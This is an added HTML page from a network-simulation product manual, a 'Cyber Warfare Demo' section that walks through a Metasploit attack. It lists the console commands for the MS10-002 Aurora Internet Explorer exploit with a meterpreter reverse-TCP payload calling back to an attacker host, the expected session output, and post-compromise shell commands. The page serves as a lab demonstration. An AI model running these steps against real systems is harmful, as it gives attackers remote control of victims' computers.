@@ -1,0 +1,161 @@
+<?xml version="1.0" encoding="utf-8"?>
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xml:lang="en" lang="en" xmlns="http://www.w3.org/1999/xhtml">
+  <head>
+    <meta http-equiv="Content-Type" content="text/html;charset=utf-8" />
+    <meta http-equiv="Content-Style-Type" content="text/css" />
+    <!-- MOTW-DISABLED saved from url=(0014)about:internet -->
+    <title>Launching Metasploit Attack</title>
+    <link rel="StyleSheet" href="css/Appendix%20A%20Cyber%20Warfare%20Demo%20(EX%20only).css" type="text/css" media="all" />
+    <link rel="StyleSheet" href="css/webworks.css" type="text/css" media="all" />
+    <script type="text/javascript" language="JavaScript1.2" src="wwhdata/common/context.js"></script>
+    <script type="text/javascript" language="JavaScript1.2" src="wwhdata/common/towwhdir.js"></script>
+    <script type="text/javascript" language="JavaScript1.2" src="wwhdata/common/wwhpagef.js"></script>
+    <script type="text/javascript" language="JavaScript1.2">
+      <!--
+        var  WebWorksRootPath = "";
+      // -->
+    </script>
+    <script type="text/javascript" language="JavaScript1.2">
+      <!--
+        // Set reference to top level help frame
+        //
+        var  WWHFrame = WWHGetWWHFrame("", true);
+      // -->
+    </script>
+    <script type="text/javascript" language="JavaScript1.2" src="scripts/expand.js"></script>
+  </head>
+  <body onload="WWHUpdate();" onunload="WWHUnload();" onkeydown="WWHHandleKeyDown((document.all||document.getElementById||document.layers)?event:null);" onkeypress="WWHHandleKeyPress((document.all||document.getElementById||document.layers)?event:null);" onkeyup="WWHHandleKeyUp((document.all||document.getElementById||document.layers)?event:null);">
+    <div>
+      <img src="snt-logo-text2-transparent-small.png" />
+    </div>
+    <br />
+    <div class="WebWorks_Breadcrumbs" style="text-align: left;">
+      <a class="WebWorks_Breadcrumb_Link" href="Appendix%20A%20Cyber%20Warfare%20Demo%20(EX%20only).6.1.html#1003851">A	Cyber Warfare Demo</a> &gt; A.8  Launching Metasploit Attack</div>
+    <hr align="left" />
+    <blockquote>
+      <div class="Heading1Numbered">A.8  <a name="1003851">Launching Metasploit Attack</a></div>
+      <div class="BodyAfterHead"><a name="1006251">In this demo, the Cyber Attacker host uses Metasploit to start a webserver that hosts a website which is infected. The victim user visits this website and gets infected. The result of the infection is to grant the attacker complete access to the victim machine. The attacker is now able to execute any command on the victim machine.</a></div>
+      <div class="Heading2Numbered">A.8.1  <a name="1003852">Preparing Metasploit Attack</a></div>
+      <div class="BodyAfterHead"><a name="1003853">Launch the Metasploit console and wait for the console to initialize. This could take up to two minutes; the initialization is complete when the “</a><span style="font-weight: bold">msf&gt;”</span> prompt is displayed.</div>
+      <div class="Body"><a name="1003854">Enter the following commands in sequence at the Metasploit console:</a></div>
+      <div class="Command_Input"><a name="1003855">&nbsp;</a></div>
+      <div class="Command_Input"><a name="1006261">use exploit/windows/browser/ms10_002_aurora</a></div>
+      <div class="Command_Input"><a name="1003856">set PAYLOAD windows/meterpreter/reverse_tcp</a></div>
+      <div class="Command_Input"><a name="1003857">set LHOST 60.1.0.27</a></div>
+      <div class="Command_Input"><a name="1003858">set URIPATH /</a></div>
+      <div class="Command_Input"><a name="1003859">exploit</a></div>
+      <div class="Body"><a name="1003860">Metasploit will display the following:</a></div>
+      <div class="Command_Input"><a name="1003861">&nbsp;</a></div>
+      <div class="Command_Input"><a name="1006274">Exploit running background job</a></div>
+      <div class="Command_Input"><a name="1003862">Started reverse handler on port 8080</a></div>
+      <div class="Command_Input"><a name="1003863">Server started</a></div>
+      <div class="Heading2Numbered">A.8.2  <a name="1003864">Infecting the Victim Host</a></div>
+      <div class="BodyAfterHead"><a name="1003865">At the Source host, launch Internet Explorer version 6.0, type in the following URL, and press enter:</a></div>
+      <div class="Declaration"><a name="1003866">&nbsp;</a></div>
+      <div class="Declaration"><a name="1006302">	</a><span style="font-weight: bold">http://60.1.0.27:8080</span></div>
+      <div class="Body"><a name="1006292">The Source host is now “infected”.</a></div>
+      <div class="Heading2Numbered">A.8.3  <a name="1003867">Compromising the Victim Host</a></div>
+      <div class="BodyAfterHead"><a name="1003868">At the Cyber Attacker host, monitor the Metasploit console and wait until the following messages are displayed:</a></div>
+      <div class="Command_Input"><a name="1003869">Sending Stage (723456 bytes)</a></div>
+      <div class="Command_Input"><a name="1003870">Meterpreter session 1 opened</a></div>
+      <div class="Body"><a name="1003871">At the Metasploit console, enter the following commands:</a></div>
+      <div class="Bulleted_Indented_outer" style="margin-left: 14.4pt">
+        <table border="0" cellspacing="0" cellpadding="0" summary="" role="presentation">
+          <tr style="vertical-align: baseline;">
+            <td>
+              <div class="Bulleted_Indented_inner" style="width: 14.4pt; white-space: nowrap;">
+                <span class="BulletSymbol">•	</span>
+              </div>
+            </td>
+            <td width="100%">
+              <div class="Bulleted_Indented_inner"><span style="font-family: &quot;Courier New&quot;; font-weight: bold"><a name="1003872">sessions –i 1</a></span><br />		The console should display: <span style="font-family: &quot;Courier New&quot;; font-weight: bold">Starting interaction with 1</span></div>
+            </td>
+          </tr>
+        </table>
+      </div>
+      <div class="Bulleted_Indented_outer" style="margin-left: 14.4pt; vertical-align: baseline">
+        <table border="0" cellspacing="0" cellpadding="0" summary="" role="presentation">
+          <tr style="vertical-align: baseline;">
+            <td>
+              <div class="Bulleted_Indented_inner" style="width: 14.4pt; white-space: nowrap;color: #000000; font-family: Arial; font-size: 10.0pt; font-style: normal; font-variant: normal; font-weight: bold; text-transform: none">
+                <span class="BulletSymbol">•	</span>
+              </div>
+            </td>
+            <td width="100%">
+              <div class="Bulleted_Indented_inner" style="color: #000000; font-family: Arial; font-size: 10.0pt; font-style: normal; font-variant: normal; font-weight: bold; text-transform: none"><span style="font-family: &quot;Courier New&quot;"><a name="1003873">use espia</a></span><br />		<span style="font-weight: normal">The console should display: </span><span style="font-family: &quot;Courier New&quot;">Loading extension espia… success</span><span style="font-weight: normal"> </span></div>
+            </td>
+          </tr>
+        </table>
+      </div>
+      <div class="Bulleted_Indented_outer" style="margin-left: 14.4pt; vertical-align: baseline">
+        <table border="0" cellspacing="0" cellpadding="0" summary="" role="presentation">
+          <tr style="vertical-align: baseline;">
+            <td>
+              <div class="Bulleted_Indented_inner" style="width: 14.4pt; white-space: nowrap;color: #000000; font-family: Arial; font-size: 10.0pt; font-style: normal; font-variant: normal; font-weight: bold; text-transform: none">
+                <span class="BulletSymbol">•	</span>
+              </div>
+            </td>
+            <td width="100%">
+              <div class="Bulleted_Indented_inner" style="color: #000000; font-family: Arial; font-size: 10.0pt; font-style: normal; font-variant: normal; font-weight: bold; text-transform: none"><span style="font-family: &quot;Courier New&quot;"><a name="1003874">shell</a></span><br />		<span style="font-weight: normal">The console should display following messages:</span></div>
+            </td>
+          </tr>
+        </table>
+      </div>
+      <div class="Command_Input"><a name="1003875">&nbsp;</a></div>
+      <div class="Command_Input"><a name="1006335">Process created.</a></div>
+      <div class="Command_Input"><a name="1003876">Channel 1 created.</a></div>
+      <div class="Command_Input"><a name="1003877">C:\Documents and Settings\..</a></div>
+      <div class="Body"><a name="1003878">At this point, the Metasploit has opened a “console” on the attacked system.</a></div>
+      <div class="Body"><a name="1003879">To compromise the victim system, do the following:</a></div>
+      <div class="Bulleted_outer" style="margin-left: 0pt">
+        <table border="0" cellspacing="0" cellpadding="0" summary="" role="presentation">
+          <tr style="vertical-align: baseline;">
+            <td>
+              <div class="Bulleted_inner" style="width: 14.4pt; white-space: nowrap;">
+                <span class="BulletSymbol">•	</span>
+              </div>
+            </td>
+            <td width="100%">
+              <div class="Bulleted_inner"><a name="1003880">Use the command </a><span style="font-family: &quot;Courier New&quot;; font-weight: bold">tasklist</span> to view all running processes on the system.</div>
+            </td>
+          </tr>
+        </table>
+      </div>
+      <div class="Bulleted_outer" style="margin-left: 0pt">
+        <table border="0" cellspacing="0" cellpadding="0" summary="" role="presentation">
+          <tr style="vertical-align: baseline;">
+            <td>
+              <div class="Bulleted_inner" style="width: 14.4pt; white-space: nowrap;">
+                <span class="BulletSymbol">•	</span>
+              </div>
+            </td>
+            <td width="100%">
+              <div class="Bulleted_inner"><a name="1003881">Use the command </a><span style="font-family: &quot;Courier New&quot;; font-weight: bold">taskkill –im &lt;task-name&gt; </span>to kill any running tasks (e.g., <span style="font-family: &quot;Courier New&quot;; font-weight: bold">taskkill –im vlc.exe</span>).</div>
+            </td>
+          </tr>
+        </table>
+      </div>
+      <script type="text/javascript" language="JavaScript1.2">
+        <!--
+          // Clear related topics
+          //
+          WWHClearRelatedTopics();
+
+          document.writeln(WWHRelatedTopicsInlineHTML());
+        // -->
+      </script>
+    </blockquote>
+    <hr align="left" />
+    <table align="left">
+      <tr>
+        <td class="WebWorks_Company_Phone_Bottom">© 2008 - 2013 SCALABLE Network Technologies, Inc. All rights reserved.</td>
+      </tr>
+    </table>
+    <script type="text/javascript" language="JavaScript1.2">
+      <!--
+        document.write(WWHRelatedTopicsDivTag() + WWHPopupDivTag() + WWHALinksDivTag());
+      // -->
+    </script>
+  </body>
+</html>
